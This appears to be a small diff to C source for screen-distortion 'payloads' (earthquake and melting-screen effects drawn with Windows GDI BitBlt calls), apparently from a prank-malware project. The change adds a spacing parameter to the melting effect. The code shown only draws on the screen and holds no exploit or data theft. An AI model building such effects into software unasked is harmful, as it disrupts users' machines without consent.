@@ -212,7 +212,7 @@ PAYLOAD payloadEarthquake(int delay, int power) {
 	FreeHDCs
 }
 
-PAYLOAD payloadMeltingScreen(int xSize, int ySize, int power) {
+PAYLOAD payloadMeltingScreen(int xSize, int ySize, int power, int distance) {
 	InitHDCs
 
 	if (xSize >= w) xSize = w - 1;
@@ -223,7 +223,8 @@ PAYLOAD payloadMeltingScreen(int xSize, int ySize, int power) {
 	SelectObject(hdc2, screenshot);
 
 	for (int i = 0; i < power; i++) {
-		int x = random() % (w - xSize);
+		int x = random() % w - xSize/2;
+		for (; x % distance != 0; x++) {}
 
 		BitBlt(hdc2, 0, 0, xSize, h, hdc, x, 0, SRCCOPY);
 
